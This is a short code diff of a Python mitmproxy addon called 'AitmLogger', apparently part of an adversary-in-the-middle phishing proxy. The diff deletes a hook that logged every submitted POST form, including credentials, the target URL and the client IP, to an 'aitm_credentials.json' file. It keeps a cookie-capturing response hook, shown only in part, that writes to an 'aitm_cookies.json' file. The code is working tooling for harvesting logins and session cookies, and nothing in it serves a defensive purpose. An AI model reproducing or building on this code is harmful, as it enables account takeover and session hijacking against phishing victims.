@@ -6,13 +6,11 @@ import traceback
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 CREDS_DIR = os.path.join(BASE_DIR, "creds")
-LOG_CREDENTIALS = os.path.join(CREDS_DIR, "aitm_credentials.json")
 LOG_COOKIES = os.path.join(CREDS_DIR, "aitm_cookies.json")
 
 os.makedirs(CREDS_DIR, exist_ok=True)
 
 def convert_bytes(obj):
-    """Recursively convert bytes to strings in dictionaries/lists."""
     if isinstance(obj, bytes):
         return obj.decode('utf-8', errors='replace')
     elif isinstance(obj, dict):
@@ -25,28 +23,6 @@ def convert_bytes(obj):
         return obj
 
 class AitmLogger:
-    def request(self, flow: http.HTTPFlow) -> None:
-        try:
-            if flow.request.method == "POST":
-                data = {}
-                if flow.request.urlencoded_form:
-                    data = dict(flow.request.urlencoded_form)
-                elif flow.request.multipart_form:
-                    data = dict(flow.request.multipart_form)
-                elif flow.request.text:
-                    data = {"raw_body": flow.request.text}
-                if data:
-                    data = convert_bytes(data)
-                    entry = {
-                        "timestamp": str(datetime.datetime.now()),
-                        "url": flow.request.url,
-                        "data": data,
-                        "client_ip": flow.client_conn.address[0]
-                    }
-                    self._append_log(LOG_CREDENTIALS, entry)
-        except Exception:
-            traceback.print_exc()
-
     def response(self, flow: http.HTTPFlow) -> None:
         try:
             cookies = flow.response.cookies
